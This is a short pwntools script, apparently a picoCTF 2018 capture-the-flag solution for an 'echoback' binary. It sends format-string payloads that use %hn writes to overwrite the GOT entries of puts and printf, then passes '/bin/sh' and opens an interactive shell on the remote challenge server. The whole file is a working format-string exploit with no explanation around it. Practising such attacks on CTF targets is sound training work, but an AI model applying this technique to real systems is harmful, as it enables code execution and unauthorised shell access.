from pwn import *

puts = 0x0804a01c
printf = 0x0804a010

#p = process('./echoback')
p = remote("2018shell2.picoctf.com", 56800)
payload = ""
payload += p32(puts)+p32(puts+2)+"%34211x%7$hn"+"%33369x%8$hn"
p.sendline(payload)

payload = ""
payload += p32(printf) + p32(printf+2) + "%33880x%7$hn" + "%33700x%8$hn"
p.sendline(payload)
p.sendline("/bin/sh")
p.interactive()
